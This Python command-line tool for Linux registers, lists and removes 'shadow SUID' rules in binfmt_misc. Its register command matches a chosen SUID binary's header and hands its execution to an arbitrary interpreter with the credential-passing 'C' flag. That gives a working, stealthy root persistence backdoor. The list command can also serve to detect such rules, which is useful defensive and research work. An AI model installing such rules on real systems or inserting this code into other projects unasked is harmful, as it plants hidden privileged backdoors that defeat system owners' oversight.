#!/usr/bin/python
import sys
import os

import argparse

EPERM  = 1
ENOENT = 2
EEXIST = 17

BINFMT_MISC_DIR = '/proc/sys/fs/binfmt_misc'

def list_sahdow_suids():
    found_shadow_suids = False
    possible_shadow_suids = [i for i in os.listdir(BINFMT_MISC_DIR) if i not in ['register', 'status']]
    for rule in possible_shadow_suids:
        with open(os.path.join(BINFMT_MISC_DIR, rule)) as f:
            data = f.read()
            if 'C' in data.split('\n')[2]:
                found_shadow_suids = True
                print(f"[+] Possible Shadow SUID rule: {rule}")
                print('\t' + data.replace('\n', '\n\t'))
    if not found_shadow_suids:
        print('[+] Hooray! no possible Shadow SUIDs found!')

def register_shadow_suid(rule_name, suid_path, interpreter_path, magic_size=128):
    format = lambda x: f"0{x}" if len(x) == 1 else x
    with open(suid_path, 'rb') as f:
        hdr = "\\x"+"\\x".join(format(hex(x)[2:]) for x in f.read(magic_size))
    try:
        register_path = os.path.join(BINFMT_MISC_DIR, 'register')
        with open(register_path, 'wb') as f:
            f.write(f":{rule_name}:M::{hdr}::{interpreter_path}:C".encode())
        print("[+] shaddow suid installed")
    except OSError:
        print("[!] Failed to set shaddow binfmt_misc rule, probably tried to pass an invalid argument", file=os.sys.stderr)
    except Exception as e:
        print(f"[!] Failed to set shaddow binfmt_misc rule: {e}", file=os.sys.stderr)

def unregister_shadow_suid(rule_name):
    with open(os.path.join(BINFMT_MISC_DIR, rule_name), 'wb') as f:
        f.write(b"-1")
    print("[+] shaddow suid removed")

def assert_root():
    if os.geteuid() != 0:
        print("[!] Not running as root, quitting...")
        exit(EPERM)

def assert_rule_exists(rule_name, should_exist: bool):
    exists = os.path.exists(os.path.join(BINFMT_MISC_DIR, rule_name))
    if should_exist and not exists:
        print(f"[!] rule '{rule_name}' does not exist!", file=os.sys.stderr)
        exit(ENOENT)
    elif not should_exist and exists:
        print(f"[!] rule '{rule_name}' already exists!", file=os.sys.stderr)
        exit(EEXIST)

def assert_suid_exsits(suid_path):
    if not os.path.exists(suid_path):
        print(f"[!] suid '{suid_path}' does not exist!", file=os.sys.stderr)
        exit(ENOENT)

def assert_interpreter_exsits(interpreter_path):
    if not os.path.exists(interpreter_path):
        print(f"[!] interpreter '{interpreter_path}' does not exist!", file=os.sys.stderr)
        exit(ENOENT)

def parse_arguments():
    parser = argparse.ArgumentParser()
    subparsers = parser.add_subparsers(help="Requested action", dest="command")
    list_parser = subparsers.add_parser("list", help="list all current shaddow SUIDs")
    register_parser = subparsers.add_parser("register", help="register a new shaddow SUID")
    register_parser.add_argument("-n", "--name", help="rule name", required=True)
    register_parser.add_argument("-s", "--suid", help="suid path", required=True)
    register_parser.add_argument("-i", "--interpreter", help="interpreter path", required=True)
    unregister_parser = subparsers.add_parser("unregister", help="unregister an existing shaddow SUID")
    unregister_parser.add_argument("-n", "--name", help="rule name", required=True)
    args = parser.parse_args()
    if args.command == None: 
        parser.print_usage()
        exit(0)
    return args

if __name__ == '__main__':
    args = parse_arguments()

    if args.command == "list":
        list_sahdow_suids()
    elif args.command == "register":
        assert_root()
        assert_rule_exists(args.name, False)
        assert_suid_exsits(args.suid)
        assert_interpreter_exsits(args.interpreter)
        register_shadow_suid(args.name, args.suid, args.interpreter)
    elif args.command == "unregister":
        assert_root()
        assert_rule_exists(args.name, True)
        unregister_shadow_suid(args.name)
    else:
        # should not get here, but in any case
        raise TypeError(f"Invalid command: {args.command}")

